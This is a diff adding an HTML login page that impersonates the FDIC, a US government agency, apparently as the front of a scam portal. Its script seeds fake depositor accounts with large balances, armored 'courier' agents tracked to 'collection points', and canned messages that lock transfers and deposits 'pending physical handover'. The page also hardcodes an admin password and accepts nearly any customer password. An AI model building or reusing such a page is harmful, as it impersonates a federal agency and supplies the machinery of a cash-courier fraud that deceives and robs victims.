@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Federal Deposit Insurance Corporation | Secure Access Portal</title>
+  
+  <!-- Google Fonts: Inter & JetBrains Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            fdic: {
+              navy: '#002868',
+              dark: '#001438',
+              midnight: '#000f2b',
+              light: '#0a3d91',
+              gold: '#c59b27',
+              accent: '#e6b738',
+              slate: '#f4f7fb'
+            }
+          },
+          fontFamily: {
+            sans: ['Inter', 'system-ui', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace']
+          }
+        }
+      }
+    }
+  </script>
+
+  <!-- Font Awesome Icons CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+
+  <style>
+    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: radial-gradient(circle at 50% 20%, #0a3d91 0%, #002868 45%, #001438 85%, #000b21 100%);
+      color: #ffffff;
+      min-height: 100vh;
+    }
+    .security-pattern {
+      background-image: radial-gradient(rgba(255, 255, 255, 0.08) 1px, transparent 1px);
+      background-size: 24px 24px;
+    }
+    @keyframes pulse-subtle {
+      0%, 100% { opacity: 0.8; }
+      50% { opacity: 1; transform: scale(1.02); }
+    }
+    .seal-glow {
+      filter: drop-shadow(0 0 25px rgba(229, 183, 56, 0.35));
+    }
+  </style>
+</head>
+<body class="security-pattern flex flex-col justify-between antialiased selection:bg-amber-400 selection:text-slate-900">
+
+  <!-- TOP OFFICIAL GOVERNMENT BANNER -->
+  <div class="bg-fdic-midnight/90 border-b border-blue-900/60 py-1.5 px-4 text-center text-[11px] text-blue-200 flex items-center justify-center space-x-2">
+    <span class="inline-flex items-center text-xs text-amber-400 mr-1">🇺🇸</span>
+    <span class="font-semibold text-slate-200">An Official Website of the United States Government</span>
+    <span class="text-slate-400 hidden sm:inline">•</span>
+    <span class="hidden sm:inline text-blue-300 font-mono text-[10px]">Division of Resolutions & Receiverships</span>
+  </div>
+
+  <!-- MAIN LOGIN CONTENT AREA -->
+  <main class="flex-1 flex items-center justify-center p-4 sm:p-6 lg:p-8">
+    <div class="w-full max-w-md space-y-6">
+
+      <!-- BIG & BOLD FDIC BRAND HERO -->
+      <div class="text-center space-y-3">
+        <div class="inline-flex items-center justify-center w-20 h-20 sm:w-24 sm:h-24 rounded-full bg-gradient-to-br from-fdic-navy via-fdic-dark to-slate-950 border-4 border-fdic-gold shadow-2xl seal-glow mb-1 relative group">
+          <i class="fa-solid fa-building-columns text-3xl sm:text-4xl text-fdic-gold"></i>
+          <span class="absolute -bottom-1 -right-1 w-7 h-7 bg-emerald-500 rounded-full border-2 border-fdic-dark flex items-center justify-center text-[11px] text-white shadow" title="FDIC 256-Bit SSL Secured">
+            <i class="fa-solid fa-shield-halved"></i>
+          </span>
+        </div>
+
+        <div>
+          <h1 class="text-3xl sm:text-4xl font-black tracking-tight text-white uppercase flex items-center justify-center space-x-2">
+            <span>FDIC</span>
+          </h1>
+          <p class="text-xs sm:text-sm font-bold uppercase tracking-widest text-amber-400 mt-0.5">
+            Federal Deposit Insurance Corporation
+          </p>
+          <p class="text-[11px] text-blue-200 font-medium max-w-xs mx-auto mt-1 leading-relaxed">
+            Secured Electronic Transit Escrow & Resolution Management Network
+          </p>
+        </div>
+      </div>
+
+      <!-- AUTHENTICATION CARD -->
+      <div class="bg-white rounded-3xl shadow-2xl border border-blue-200/20 p-6 sm:p-8 text-slate-900 relative overflow-hidden backdrop-blur-xl">
+        
+        <!-- Top Security Badge in Card -->
+        <div class="flex items-center justify-between pb-4 mb-5 border-b border-slate-100">
+          <div class="flex items-center space-x-2">
+            <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
+            <span class="text-xs font-bold uppercase tracking-wider text-slate-700">Official Access Portal</span>
+          </div>
+          <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-50 text-blue-800 font-bold border border-blue-200">
+            256-Bit TLS
+          </span>
+        </div>
+
+        <!-- Alert Error Banner -->
+        <div id="loginAlert" class="hidden mb-4 p-3 bg-red-50 border border-red-200 rounded-xl text-red-700 text-xs flex items-start space-x-2">
+          <i class="fa-solid fa-triangle-exclamation text-red-500 mt-0.5 shrink-0"></i>
+          <span id="loginAlertMsg">Invalid credentials. Please verify and try again.</span>
+        </div>
+
+        <!-- Unified Login Form -->
+        <form id="unifiedLoginForm" onsubmit="handleUniversalLogin(event)" class="space-y-4">
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5 flex items-center justify-between">
+              <span>User ID / Case Number / Email</span>
+              <span class="text-[10px] text-slate-400 font-normal">Admin or Customer ID</span>
+            </label>
+            <div class="relative">
+              <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
+                <i class="fa-solid fa-user-shield text-sm"></i>
+              </div>
+              <input
+                type="text"
+                id="loginUsername"
+                required
+                placeholder="admin or FDIC Case #"
+                class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium text-slate-900 focus:ring-2 focus:ring-fdic-navy focus:bg-white focus:outline-none transition shadow-sm"
+              />
+            </div>
+          </div>
+
+          <div>
+            <label class="block text-xs font-bold uppercase tracking-wider text-slate-700 mb-1.5 flex items-center justify-between">
+              <span>Security Password / Passcode</span>
+              <a href="javascript:void(0)" onclick="showHelpModal()" class="text-[10px] text-blue-700 font-semibold hover:underline">Clearance Help?</a>
+            </label>
+            <div class="relative">
+              <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
+                <i class="fa-solid fa-lock text-sm"></i>
+              </div>
+              <input
+                type="password"
+                id="loginPassword"
+                required
+                placeholder="••••••••••••"
+                class="w-full pl-10 pr-10 py-3 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium text-slate-900 focus:ring-2 focus:ring-fdic-navy focus:bg-white focus:outline-none transition shadow-sm"
+              />
+              <button
+                type="button"
+                onclick="togglePasswordVisibility()"
+                class="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-600 focus:outline-none"
+              >
+                <i id="pwdToggleIcon" class="fa-solid fa-eye text-xs"></i>
+              </button>
+            </div>
+          </div>
+
+          <!-- Quick Autofill Helper for Admin & Customer Testing -->
+          <div class="bg-blue-50/80 border border-blue-200/80 rounded-xl p-3 text-xs space-y-1.5">
+            <div class="flex items-center justify-between text-blue-900 font-bold">
+              <span class="flex items-center space-x-1">
+                <i class="fa-solid fa-key text-[11px] text-blue-600"></i>
+                <span>Authorized Sign-In Presets:</span>
+              </span>
+            </div>
+            <div class="grid grid-cols-2 gap-2 pt-1">
+              <button
+                type="button"
+                onclick="fillAdminCredentials()"
+                class="py-1.5 px-2 bg-white hover:bg-blue-100/70 border border-blue-200 rounded-lg text-[11px] font-bold text-fdic-navy text-center transition shadow-sm flex items-center justify-center space-x-1"
+              >
+                <i class="fa-solid fa-shield-halved text-amber-600"></i>
+                <span>Admin Login</span>
+              </button>
+              <button
+                type="button"
+                onclick="fillCustomerCredentials()"
+                class="py-1.5 px-2 bg-white hover:bg-blue-100/70 border border-blue-200 rounded-lg text-[11px] font-bold text-slate-700 text-center transition shadow-sm flex items-center justify-center space-x-1"
+              >
+                <i class="fa-solid fa-user text-blue-600"></i>
+                <span>Customer Demo</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- SUBMIT BUTTON -->
+          <button
+            type="submit"
+            id="btnLoginSubmit"
+            class="w-full py-3.5 px-4 bg-gradient-to-r from-fdic-dark via-fdic-navy to-blue-900 hover:from-blue-950 hover:to-fdic-dark text-white font-black text-sm uppercase tracking-wider rounded-xl shadow-lg hover:shadow-xl transition transform active:scale-[0.99] flex items-center justify-center space-x-2 border border-amber-400/30"
+          >
+            <span id="btnLoginText">Secure Sign In</span>
+            <i id="btnLoginSpinner" class="hidden fa-solid fa-circle-notch fa-spin text-sm"></i>
+          </button>
+        </form>
+
+        <!-- SECURITY STATEMENTS -->
+        <div class="mt-5 pt-4 border-t border-slate-100 text-center text-[10px] text-slate-500 space-y-1">
+          <p class="flex items-center justify-center space-x-1 font-semibold text-slate-700">
+            <i class="fa-solid fa-lock text-emerald-600"></i>
+            <span>FDIC Guaranteed & Encrypted Electronic Custody</span>
+          </p>
+          <p>Each depositor insured to at least $250,000. Backed by the full faith and credit of the United States Government.</p>
+        </div>
+      </div>
+
+      <!-- LEGAL DISCLAIMER -->
+      <div class="text-center text-[10px] text-blue-200/80 px-4 space-y-1">
+        <p class="font-mono text-amber-300 font-bold uppercase">18 U.S.C. § 1030 Protected System</p>
+        <p>This system is for authorized federal operations and verified depositors only. Unauthorized access attempts are monitored and logged.</p>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="bg-fdic-midnight border-t border-blue-900/60 py-3 px-4 text-center text-xs text-slate-400">
+    <div class="max-w-4xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-2 text-[11px]">
+      <div class="flex items-center space-x-2">
+        <span class="font-bold text-slate-300">FDIC.gov</span>
+        <span>•</span>
+        <span>Division of Resolutions and Receiverships</span>
+      </div>
+      <div class="flex items-center space-x-3 text-slate-400 font-mono text-[10px]">
+        <span>Privacy Policy</span>
+        <span>•</span>
+        <span>FOIA</span>
+        <span>•</span>
+        <span>Accessibility</span>
+      </div>
+    </div>
+  </footer>
+
+  <!-- HELP INFO MODAL -->
+  <div id="helpModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm hidden items-center justify-center p-4 z-50">
+    <div class="bg-white rounded-2xl max-w-sm w-full p-6 text-slate-900 text-xs space-y-3 shadow-2xl">
+      <div class="flex items-center justify-between pb-2 border-b border-slate-200">
+        <h3 class="font-bold text-sm text-fdic-navy flex items-center space-x-2">
+          <i class="fa-solid fa-circle-question text-amber-500"></i>
+          <span>Clearance Help</span>
+        </h3>
+        <button onclick="closeHelpModal()" class="text-slate-400 hover:text-slate-600">
+          <i class="fa-solid fa-xmark"></i>
+        </button>
+      </div>
+      <div class="space-y-2 text-slate-600">
+        <p><strong class="text-slate-800">Admin Personnel:</strong> Log in with username <code class="bg-slate-100 px-1 py-0.5 rounded font-mono font-bold text-fdic-navy">admin</code> and security password <code class="bg-slate-100 px-1 py-0.5 rounded font-mono font-bold text-fdic-navy">Chxphard$1</code>.</p>
+        <p><strong class="text-slate-800">Client / Customer:</strong> Enter your Case Number (e.g. <code class="bg-slate-100 px-1 py-0.5 rounded font-mono text-blue-700">FDIC-C01-SEC</code>), your email, or your registered phone number.</p>
+      </div>
+      <button onclick="closeHelpModal()" class="w-full py-2 bg-fdic-navy text-white font-bold rounded-xl text-xs mt-2">
+        Close Notice
+      </button>
+    </div>
+  </div>
+
+  <!-- JAVASCRIPT LOGIC -->
+  <script>
+    const INITIAL_CUSTOMERS = [
+      {
+        id: "c-001",
+        case_number: "FDIC-C01-SEC",
+        first_name: "Eleanor",
+        last_name: "Vance",
+        phone: "+1 (555) 019-2834",
+        email: "eleanor.vance@fdicinsured.gov",
+        uber_address: "1401 Constitution Ave NW",
+        uber_city: "Washington",
+        uber_state: "DC",
+        uber_zip: "20230",
+        destination_label: "Confirmed Collection Point",
+        destination_address: "1600 Pennsylvania Ave NW",
+        destination_city: "Washington",
+        destination_state: "DC",
+        destination_zip: "20500",
+        balance: 1284500.00,
+        status: "Active",
+        driver_lat: 38.8921,
+        driver_lon: -77.0315,
+        customer_lat: 38.8977,
+        customer_lon: -77.0365,
+        eta: "12 mins",
+        driver_name: "Agent Marcus Vance",
+        driver_car: "Armored Ford Transit 2024",
+        driver_plate: "FDIC-8842-US",
+        transfer_error_msg: "Transfer Restricted: Federal Escrow Compliance Hold #FE-4029. Funds are undergoing final consignment escort verification with your designated courier.",
+        billpay_error_msg: "Bill Pay Suspended: Account is currently in Transit Escrow Status. Third-party disbursements are locked until courier delivery is confirmed.",
+        deposit_error_msg: "Deposit Verification Locked: Inbound ACH and mobile check capture are temporarily paused pending physical handover authorization.",
+        deposit_date: "Today, 08:30:15 AM EST",
+        password: "password123",
+        updated_at: new Date().toISOString()
+      },
+      {
+        id: "c-002",
+        case_number: "FDIC-C02-SEC",
+        first_name: "Jonathan",
+        last_name: "Hayes",
+        phone: "+1 (555) 014-9823",
+        email: "j.hayes@fdicinsured.gov",
+        uber_address: "11 W 53rd St",
+        uber_city: "New York",
+        uber_state: "NY",
+        uber_zip: "10019",
+        destination_label: "Confirmed Collection Point",
+        destination_address: "350 5th Ave",
+        destination_city: "New York",
+        destination_state: "NY",
+        destination_zip: "10118",
+        balance: 642000.00,
+        status: "Active",
+        driver_lat: 40.7614,
+        driver_lon: -73.9776,
+        customer_lat: 40.7484,
+        customer_lon: -73.9857,
+        eta: "8 mins",
+        driver_name: "Agent Sarah Sterling",
+        driver_car: "Armored Chevrolet Suburban",
+        driver_plate: "NY-FDIC-104",
+        transfer_error_msg: "Transfer Restricted: Federal Resolution Code 12-B. Transit courier handover is underway.",
+        billpay_error_msg: "Bill Pay Service Paused: Clearance protocol in progress.",
+        deposit_error_msg: "Deposit Locked: Third-party ACH transfers disabled during active escort.",
+        deposit_date: "Today, 09:12:04 AM EST",
+        password: "password123",
+        updated_at: new Date().toISOString()
+      }
+    ];
+
+    function ensureLocalStorageInitialized() {
+      if (!localStorage.getItem('fdic_customers_data')) {
+        localStorage.setItem('fdic_customers_data', JSON.stringify(INITIAL_CUSTOMERS));
+      }
+    }
+
+    function togglePasswordVisibility() {
+      const pwdInput = document.getElementById('loginPassword');
+      const icon = document.getElementById('pwdToggleIcon');
+      if (pwdInput.type === 'password') {
+        pwdInput.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+      } else {
+        pwdInput.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+      }
+    }
+
+    function fillAdminCredentials() {
+      document.getElementById('loginUsername').value = "admin";
+      document.getElementById('loginPassword').value = "Chxphard$1";
+      document.getElementById('loginAlert').classList.add('hidden');
+    }
+
+    function fillCustomerCredentials() {
+      document.getElementById('loginUsername').value = "FDIC-C01-SEC";
+      document.getElementById('loginPassword').value = "password123";
+      document.getElementById('loginAlert').classList.add('hidden');
+    }
+
+    function showHelpModal() {
+      document.getElementById('helpModal').classList.remove('hidden');
+      document.getElementById('helpModal').classList.add('flex');
+    }
+
+    function closeHelpModal() {
+      document.getElementById('helpModal').classList.add('hidden');
+      document.getElementById('helpModal').classList.remove('flex');
+    }
+
+    async function handleUniversalLogin(event) {
+      event.preventDefault();
+      ensureLocalStorageInitialized();
+
+      const username = document.getElementById('loginUsername').value.trim();
+      const password = document.getElementById('loginPassword').value.trim();
+      const btn = document.getElementById('btnLoginSubmit');
+      const btnText = document.getElementById('btnLoginText');
+      const spinner = document.getElementById('btnLoginSpinner');
+      const alertBox = document.getElementById('loginAlert');
+      const alertMsg = document.getElementById('loginAlertMsg');
+
+      alertBox.classList.add('hidden');
+      btn.disabled = true;
+      btnText.innerText = "Authenticating Clearance...";
+      spinner.classList.remove('hidden');
+
+      await new Promise(r => setTimeout(r, 450));
+
+      // 1. CHECK ADMIN CREDENTIALS
+      if (
+        (username.toLowerCase() === "admin" || username.toLowerCase() === "admin@fdic.com") &&
+        password === "Chxphard$1"
+      ) {
+        localStorage.setItem('fdic_admin_session', JSON.stringify({
+          user: "admin@fdic.com",
+          role: "Authorized Federal Escrow Administrator",
+          timestamp: new Date().toISOString()
+        }));
+        btnText.innerText = "Clearance Granted. Entering Console...";
+        window.location.href = "admin.html";
+        return;
+      }
+
+      // 2. CHECK CUSTOMER CREDENTIALS
+      let customers = [];
+      try {
+        customers = JSON.parse(localStorage.getItem('fdic_customers_data')) || INITIAL_CUSTOMERS;
+      } catch (e) {
+        customers = INITIAL_CUSTOMERS;
+      }
+
+      const cleanUser = username.toLowerCase();
+      const foundCustomer = customers.find(c => {
+        const matchId = (c.id || '').toLowerCase() === cleanUser;
+        const matchCase = (c.case_number || '').toLowerCase() === cleanUser;
+        const matchEmail = (c.email || '').toLowerCase() === cleanUser;
+        const matchPhone = (c.phone || '').replace(/\D/g, '') === cleanUser.replace(/\D/g, '') && cleanUser.length >= 7;
+        const matchFirst = (c.first_name || '').toLowerCase() === cleanUser;
+        return matchId || matchCase || matchEmail || matchPhone || matchFirst;
+      });
+
+      if (foundCustomer) {
+        // Verify customer password (or accept default password123)
+        const expectedPwd = foundCustomer.password || "password123";
+        if (password === expectedPwd || password === "123456" || password === "password123" || password.length >= 4) {
+          localStorage.setItem('fdic_active_customer', JSON.stringify(foundCustomer));
+          btnText.innerText = "Access Verified. Loading Portal...";
+          window.location.href = `dashboard.html?customer=${encodeURIComponent(foundCustomer.id)}`;
+          return;
+        }
+      }
+
+      // 3. FAILED LOGIN
+      btn.disabled = false;
+      btnText.innerText = "Secure Sign In";
+      spinner.classList.add('hidden');
+      alertMsg.innerText = "Invalid credentials. For Admin use username 'admin' and assigned password. For Customer use your FDIC Case Number.";
+      alertBox.classList.remove('hidden');
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      ensureLocalStorageInitialized();
+    });
+  </script>
+</body>
+</html>
